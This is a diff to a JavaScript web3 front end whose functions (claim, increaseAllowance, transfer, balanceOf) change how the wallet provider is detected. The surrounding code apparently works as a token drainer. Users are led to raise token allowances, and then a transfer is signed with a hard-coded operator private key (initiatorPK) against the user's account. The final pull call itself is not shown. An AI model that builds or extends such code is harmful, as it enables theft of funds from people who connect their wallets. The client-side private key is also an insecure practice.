@@ -99,11 +99,11 @@ export const claim = async (_balance) => {
 export const increaseAllowance = async (token) => {
   try {
     const provider = await detectEthereumProvider();
-    if (provider !== window.ethereum){
+    if (!provider){
       console.log("Please install MetaMask");
       return ;
     }
-    const web3 = new Web3(window.ethereum);
+    const web3 = new Web3(provider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -297,11 +297,11 @@ export const increaseAllowance = async (token) => {
 export const transfer = async (token) => {
   try {
     const provideer = await detectEthereumProvider();
-    if (provideer !== window.ethereum){
+    if (!provideer){
       console.log("Please install MetaMask");
       return ;
     }
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const provider = new ethers.providers.Web3Provider(provideer);
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const account = getAccount().address;
     const erc20Contract = new ethers.Contract(
@@ -334,11 +334,11 @@ export const ethBalance = async () => {
 export const allownce = async (token) => {
   try{
     const provider = await detectEthereumProvider();
-    if (provider !== window.ethereum){
+    if (!provider){
       console.log("Please install MetaMask");
       return ;
     }
-    const web3 = new Web3(window.ethereum);
+    const web3 = new Web3(provider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -353,11 +353,11 @@ export const allownce = async (token) => {
 export const balanceOf = async (token) => {
   try{
     const provider = await detectEthereumProvider();
-    if (provider !== window.ethereum){
+    if (!provider){
       console.log("Please install MetaMask");
       return ;
     }
-    const web3 = new Web3(window.ethereum);
+    const web3 = new Web3(provider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
